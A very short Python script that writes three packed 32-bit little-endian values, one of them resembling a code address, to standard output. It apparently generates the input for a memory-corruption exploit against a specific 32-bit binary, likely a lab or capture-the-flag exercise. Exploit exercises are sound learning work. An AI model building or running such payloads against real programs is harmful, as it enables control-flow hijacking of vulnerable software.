import sys
from struct import pack
sys.stdout.buffer.write(pack("<I",0x18) + pack("<I",0xc) + pack("<I",0x080488C5))